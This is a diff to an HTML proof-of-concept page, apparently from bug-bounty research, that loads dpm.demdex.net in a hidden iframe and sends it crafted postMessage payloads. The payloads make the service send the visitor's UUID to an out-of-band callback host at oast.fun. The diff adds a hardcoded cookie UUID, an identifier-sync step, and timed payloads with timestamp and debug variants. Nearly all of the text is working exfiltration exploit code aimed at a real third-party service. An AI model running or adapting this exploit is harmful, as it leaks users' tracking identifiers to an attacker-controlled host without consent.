@@ -1,16 +1,18 @@
 <!DOCTYPE html>
 <html>
-<head><title>PoC</title></head>
+<head><title>PoC - UUID Exfil</title></head>
 <body>
   <h2>PoC Running...</h2>
-  <div id="status">Loading iframe...</div>
+  <div id="status">Loading...</div>
 
   <script>
     var sender   = "https://elia874.github.io";
     var callback = "https://vqlgkysoxnjswaflcnwdnfne34x7tg7d0.oast.fun";
     var target   = "https://dpm.demdex.net/dest4.html?d_nsid=0";
-
     var iframeURL = target + "#" + sender + "//elia874.github.io";
+
+    // The real UUID from your demdex cookie
+    var knownUUID = "14508150869269091001715104494978158981";
 
     var iframe = document.createElement("iframe");
     iframe.style.display = "none";
@@ -18,17 +20,32 @@
     document.body.appendChild(iframe);
 
     iframe.onload = function () {
-      document.getElementById("status").innerText = "Iframe loaded! Firing payloads...";
+      document.getElementById("status").innerText = "Iframe loaded!";
 
-      var p1 = "---destpub---dests|1|img|" + callback + "/?hit=basic|10080";
-      var p2 = "---destpub---dests|2|img|" + callback + "/?uuid=%did%|10080";
+      // Step 1: Send ibs message first to populate dpids.uuid
+      // Format: ---destpub---ibs|id|tag|url|ttl|dpType|uuid,dpid,dpuuid
+      var ibs = "---destpub---ibs|60|img|//idsync.rlcdn.com/test.gif|14400|1|"
+              + knownUUID + ",,";
+
+      // Step 2: UUID via %did% macro (after dpids is set)
+      var p1 = "---destpub---dests|1|img|" + callback + "/?uuid=%did%|10080";
+
+      // Step 3: Timestamp proof
+      var p2 = "---destpub---dests|2|img|" + callback + "/?ts=%timestamp%&uuid=%did%|10080";
+
+      // Step 4: Debug mode
       var p3 = "---destpub-debug---dests|3|img|" + callback + "/?debug=1&uuid=%did%|10080";
 
-      iframe.contentWindow.postMessage(p1, "https://dpm.demdex.net");
-      iframe.contentWindow.postMessage(p2, "https://dpm.demdex.net");
-      iframe.contentWindow.postMessage(p3, "https://dpm.demdex.net");
+      // Fire ibs first, then dests after delay
+      iframe.contentWindow.postMessage(ibs, "https://dpm.demdex.net");
 
-      document.getElementById("status").innerText = "Payloads fired! Watch interactsh...";
+      setTimeout(function() {
+        iframe.contentWindow.postMessage(p1, "https://dpm.demdex.net");
+        iframe.contentWindow.postMessage(p2, "https://dpm.demdex.net");
+        iframe.contentWindow.postMessage(p3, "https://dpm.demdex.net");
+        document.getElementById("status").innerText = 
+          "All payloads fired! Check interactsh...";
+      }, 1000);
     };
   </script>
 </body>
